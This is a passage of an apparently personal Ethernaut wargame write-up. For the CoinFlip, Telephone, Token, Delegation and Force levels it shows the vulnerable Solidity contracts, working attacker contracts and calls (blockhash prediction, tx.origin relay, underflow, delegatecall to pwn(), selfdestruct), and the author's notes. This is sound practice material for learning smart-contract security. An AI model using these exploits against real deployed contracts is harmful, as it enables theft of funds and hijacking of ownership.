+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">CoinFlip</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint256</span> <span style="color:#66d9ef">public</span> consecutiveWins;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint256</span> lastHash;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint256</span> FACTOR <span style="color:#f92672">=</span> <span style="color:#ae81ff">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">constructor</span>() {
+</span></span><span style="display:flex;"><span>    consecutiveWins <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">flip</span>(<span style="color:#66d9ef">bool</span> _guess) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint256</span> blockValue <span style="color:#f92672">=</span> <span style="color:#66d9ef">uint256</span>(blockhash(block.number <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (lastHash <span style="color:#f92672">==</span> blockValue) {
+</span></span><span style="display:flex;"><span>      revert();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    lastHash <span style="color:#f92672">=</span> blockValue;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint256</span> coinFlip <span style="color:#f92672">=</span> blockValue <span style="color:#f92672">/</span> FACTOR;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">bool</span> side <span style="color:#f92672">=</span> coinFlip <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (side <span style="color:#f92672">==</span> _guess) {
+</span></span><span style="display:flex;"><span>      consecutiveWins<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      consecutiveWins <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="41-solution">4.1 Solution</h3>
+<p>As blocknumber &amp; blockhash can be calculated by us before calling the flip().</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">CoinFlip</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint256</span> <span style="color:#66d9ef">public</span> consecutiveWins;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint256</span> lastHash;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint256</span> FACTOR <span style="color:#f92672">=</span> <span style="color:#ae81ff">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">constructor</span>() {
+</span></span><span style="display:flex;"><span>    consecutiveWins <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">flip</span>(<span style="color:#66d9ef">bool</span> _guess) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint256</span> blockValue <span style="color:#f92672">=</span> <span style="color:#66d9ef">uint256</span>(blockhash(block.number <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (lastHash <span style="color:#f92672">==</span> blockValue) {
+</span></span><span style="display:flex;"><span>      revert();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    lastHash <span style="color:#f92672">=</span> blockValue;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint256</span> coinFlip <span style="color:#f92672">=</span> blockValue <span style="color:#f92672">/</span> FACTOR;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">bool</span> side <span style="color:#f92672">=</span> coinFlip <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (side <span style="color:#f92672">==</span> _guess) {
+</span></span><span style="display:flex;"><span>      consecutiveWins<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      consecutiveWins <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">CoinFlip_guess</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint256</span> lastHash;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint256</span> FACTOR <span style="color:#f92672">=</span> <span style="color:#ae81ff">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  CoinFlip <span style="color:#66d9ef">private</span> abc<span style="color:#f92672">=</span> CoinFlip(<span style="color:#f92672">**</span>INSTANCE ADDRESS<span style="color:#f92672">**</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">setCoinFlip</span>(<span style="color:#66d9ef">address</span> _addr) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">payable</span>{
+</span></span><span style="display:flex;"><span>    abc <span style="color:#f92672">=</span> CoinFlip(_addr);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">flip_guess</span>() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint256</span> blockValue <span style="color:#f92672">=</span> <span style="color:#66d9ef">uint256</span>(blockhash(block.number <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    lastHash <span style="color:#f92672">=</span> blockValue;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint256</span> coinFlip <span style="color:#f92672">=</span> blockValue <span style="color:#f92672">/</span> FACTOR;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">bool</span> side <span style="color:#f92672">=</span> coinFlip <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> abc.flip(side);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="42-remark">4.2 Remark</h3>
+<pre><code>address.transfer(_amount)
+address.transfer(_amount)
+address.transfer(_amount)
+address.transfer(_amount)
+address.transfer(_amount)
+</code></pre>
+<p>Recognized how slow blockchian is&hellip;&hellip;
+Annoyed</p>
+<ul>
+<li>How to call another contract?
+<a href="https://www.quicknode.com/guides/ethereum-development/smart-contracts/how-to-call-another-smart-contract-from-your-solidity-code" target="_blank">smart contract call another smart contract</a></li>
+<li>How to get another contract&rsquo;s blocknumber/blockhash? not other contract&hellip;contract instnace, public accessible while calling the contract</li>
+<li>Got this error while using browser remix &ldquo;Gas estimation failed&rdquo; (*click &ldquo;cancel&rdquo;, otherwise need to referesh the browser)</li>
+</ul>
+<h2 id="5-ethernaut5---telephone">5. Ethernaut5 - Telephone</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Telephone</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> owner;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">constructor</span>() {
+</span></span><span style="display:flex;"><span>    owner <span style="color:#f92672">=</span> msg.sender;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">changeOwner</span>(<span style="color:#66d9ef">address</span> _owner) <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (tx.origin <span style="color:#f92672">!=</span> msg.sender) {
+</span></span><span style="display:flex;"><span>      owner <span style="color:#f92672">=</span> _owner;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="51-solution">5.1 Solution</h3>
+<p><strong>tx.origin vs msg.sender</strong></p>
+<blockquote>
+<p>tx.origin: address of the EOA (externally ownder account)</p></blockquote>
+<blockquote>
+<p>msg.sender: address that currenlty executing the contract</p></blockquote>
+<p><strong>WRONG</strong>
+
+
+<script type="module">
+    import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs';
+
+    const lsTheme = localStorage.getItem("theme")
+    const hugoTheme = document.body.classList.contains("dark-theme") ? "dark" : null
+    const currTheme = lsTheme ? lsTheme : hugoTheme;
+    const mermaidTheme = currTheme == "light" ? "default" : "dark"
+
+    mermaid.initialize({theme: mermaidTheme});
+</script>
+
+
+
+<div class="mermaid">
+sequenceDiagram
+NewOwner->>Telephone:Wrong
+
+</div>
+</p>
+<p><strong>CORRECT</strong>
+
+
+<div class="mermaid">
+sequenceDiagram
+NewO->>ContractA:msg.sender to ContractA
+ContractA->>Telephone:Telephone.owner=NewOwner
+
+</div>
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Telephone</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> owner;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">constructor</span>() {
+</span></span><span style="display:flex;"><span>    owner <span style="color:#f92672">=</span> msg.sender;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">changeOwner</span>(<span style="color:#66d9ef">address</span> _owner) <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (tx.origin <span style="color:#f92672">!=</span> msg.sender) {
+</span></span><span style="display:flex;"><span>      owner <span style="color:#f92672">=</span> _owner;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Call</span> {
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  Telephone abc <span style="color:#f92672">=</span> Telephone(<span style="color:#f92672">**</span>INSTASNCE ADDRESS<span style="color:#f92672">**</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">change</span>() <span style="color:#66d9ef">public</span>{
+</span></span><span style="display:flex;"><span>    abc.changeOwner(<span style="color:#f92672">**</span>YOUR WALLET ADDRESS<span style="color:#f92672">**</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="52-remark">5.2 Remark</h3>
+<ul>
+<li>How to call another contract?
+<a href="https://www.quicknode.com/guides/ethereum-development/smart-contracts/how-to-call-another-smart-contract-from-your-solidity-code" target="_blank">smart contract call another smart contract</a></li>
+</ul>
+<h2 id="6-ethernaut6---token">6. Ethernaut6 - Token</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Token</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">mapping</span>(<span style="color:#66d9ef">address</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">uint</span>) balances;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint</span> <span style="color:#66d9ef">public</span> totalSupply;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">constructor</span>(<span style="color:#66d9ef">uint</span> _initialSupply) <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    balances[msg.sender] <span style="color:#f92672">=</span> totalSupply <span style="color:#f92672">=</span> _initialSupply;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">transfer</span>(<span style="color:#66d9ef">address</span> _to, <span style="color:#66d9ef">uint</span> _value) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>) {
+</span></span><span style="display:flex;"><span>    require(balances[msg.sender] <span style="color:#f92672">-</span> _value <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    balances[msg.sender] <span style="color:#f92672">-=</span> _value;
+</span></span><span style="display:flex;"><span>    balances[_to] <span style="color:#f92672">+=</span> _value;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">balanceOf</span>(<span style="color:#66d9ef">address</span> _owner) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint</span> balance) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> balances[_owner];
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="61-solution">6.1 Solution</h3>
+<h4 id="solution1">Solution1</h4>
+<p>Typical overflow, uint, 0-1=a very large number, transfer(VALID_WALLET,-21)</p>
+<h4 id="solution2">Solution2</h4>
+<p>Create another contract, send a large number to wallet, idk why it works, but works</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Token</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">mapping</span>(<span style="color:#66d9ef">address</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">uint</span>) balances;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint</span> <span style="color:#66d9ef">public</span> totalSupply;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">constructor</span>(<span style="color:#66d9ef">uint</span> _initialSupply) <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    balances[msg.sender] <span style="color:#f92672">=</span> totalSupply <span style="color:#f92672">=</span> _initialSupply;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">transfer</span>(<span style="color:#66d9ef">address</span> _to, <span style="color:#66d9ef">uint</span> _value) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>) {
+</span></span><span style="display:flex;"><span>    require(balances[msg.sender] <span style="color:#f92672">-</span> _value <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    balances[msg.sender] <span style="color:#f92672">-=</span> _value;
+</span></span><span style="display:flex;"><span>    balances[_to] <span style="color:#f92672">+=</span> _value;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">balanceOf</span>(<span style="color:#66d9ef">address</span> _owner) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint</span> balance) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> balances[_owner];
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">TwiceTransfer</span>{
+</span></span><span style="display:flex;"><span>  Token abc <span style="color:#f92672">=</span> Token(<span style="color:#f92672">**</span>INSTANCE_ADDRESS<span style="color:#f92672">**</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">twiceTransfer</span>() <span style="color:#66d9ef">public</span>{
+</span></span><span style="display:flex;"><span>      abc.transfer(<span style="color:#f92672">**</span>WALLET_ADDRESS<span style="color:#f92672">**</span>,<span style="color:#ae81ff">2000000000</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="62-remark">6.2 Remark</h3>
+<ul>
+<li>Why Solution2 works? should stops at &ldquo;require(balances[msg.sender] - _value &gt;= 0);&rdquo;</li>
+<li>import &ldquo;hardhat/console.sol&rdquo;; //for debugging</li>
+</ul>
+<h2 id="7-ethernaut7---delegation">7. Ethernaut7 - Delegation</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Delegate</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> owner;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">constructor</span>(<span style="color:#66d9ef">address</span> _owner) {
+</span></span><span style="display:flex;"><span>    owner <span style="color:#f92672">=</span> _owner;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">pwn</span>() <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    owner <span style="color:#f92672">=</span> msg.sender;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Delegation</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> owner;
+</span></span><span style="display:flex;"><span>  Delegate delegate;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">constructor</span>(<span style="color:#66d9ef">address</span> _delegateAddress) {
+</span></span><span style="display:flex;"><span>    delegate <span style="color:#f92672">=</span> Delegate(_delegateAddress);
+</span></span><span style="display:flex;"><span>    owner <span style="color:#f92672">=</span> msg.sender;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  fallback() <span style="color:#66d9ef">external</span> {
+</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">bool</span> result,) <span style="color:#f92672">=</span> <span style="color:#66d9ef">address</span>(delegate).delegatecall(msg.data);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (result) {
+</span></span><span style="display:flex;"><span>      this;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="71-solution">7.1 Solution</h3>
+<h4 id="df-fallback-will-be-triggered-as-below">df: fallback(), will be triggered as below:</h4>
+<ul>
+<li>calling an non-exists function</li>
+<li>Low level interaction that no receive() or  msg.data is not empty</li>
+</ul>
+<p>contract.sendTransaction({data:web3.utils.sha3(&ldquo;pwn()&rdquo;).slice(0,10)});;</p>
+<h3 id="72-remark">7.2 Remark</h3>
+<p>Was trying to calculate the pwn() bytes, annoyed,</p>
+<ul>
+<li>if any way to call contract with .sol</li>
+<li>how to calculate the bytes</li>
+<li>what&rsquo;s bytes4</li>
+<li>how can I know this before heading to a walkthrough</li>
+</ul>
+<p>Another way to do low level call: <strong>contract.sendTransaction({data:web3.utils.sha3(&ldquo;pwn()&rdquo;).slice(0,10)});</strong></p>
+<p>Method id: 4 bytes, 0xaabbccdd</p>
+<h2 id="8-ethernaut8---force">8. Ethernaut8 - Force</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Force</span> {<span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                   MEOW ?
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         /\_/\   /
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    ____/ o o \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  /~____  =ø= /
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> (______)__m_m)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>}
+</span></span></code></pre></div><h3 id="81-solution">8.1 Solution</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Force</span> {<span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                   MEOW ?
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         /\_/\   /
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    ____/ o o \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  /~____  =ø= /
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> (______)__m_m)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Hack</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">constructor</span>(<span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> _target) <span style="color:#66d9ef">payable</span> {
+</span></span><span style="display:flex;"><span>    selfdestruct(_target);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="82-remark">8.2 Remark</h3>
+<p>How do I know selfdestrcut????</p>
+<p>Anyway, contract amount can be manipulated by anyone else, don&rsquo;t use it as a decision factor</p>
+<h2 id="9-ethernaut9---vault">9. Ethernaut9 - Vault</h2>
